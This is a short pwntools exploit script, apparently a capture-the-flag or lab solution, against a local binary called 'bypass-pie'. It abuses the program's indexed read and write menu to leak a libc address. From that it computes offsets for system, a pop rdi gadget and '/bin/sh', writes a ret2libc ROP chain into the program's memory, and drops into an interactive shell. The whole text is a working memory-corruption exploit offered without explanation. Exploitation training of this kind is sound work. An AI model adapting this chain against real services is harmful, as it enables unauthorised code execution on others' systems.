from pwn import *

p = process('./bypass-pie')

p.recvuntil(b': ')
p.send(b'R')
p.recvuntil(b': ')
p.sendline(b'7')
p.recvuntil(b': ')

libc = int(p.recvline()) - 0x29d90
system = libc + 0x50d70
pop_rdi = libc + 0x2a3e5
binsh = libc + 0x1d8678
print(hex(libc))

p.recvuntil(b': ')
p.send(b'W')
p.recvuntil(b': ')
p.sendline(b'7')
p.recvuntil(b': ')
p.sendline(str(pop_rdi).encode())

p.recvuntil(b': ')
p.send(b'W')
p.recvuntil(b': ')
p.sendline(b'8')
p.recvuntil(b': ')
p.sendline(str(binsh).encode())

p.recvuntil(b': ')
p.send(b'W')
p.recvuntil(b': ')
p.sendline(b'9')
p.recvuntil(b': ')
p.sendline(str(pop_rdi + 1).encode())

p.recvuntil(b': ')
p.send(b'W')
p.recvuntil(b': ')
p.sendline(b'10')
p.recvuntil(b': ')
p.sendline(str(system).encode())

p.recvuntil(b': ')
p.send(b'E')

p.interactive()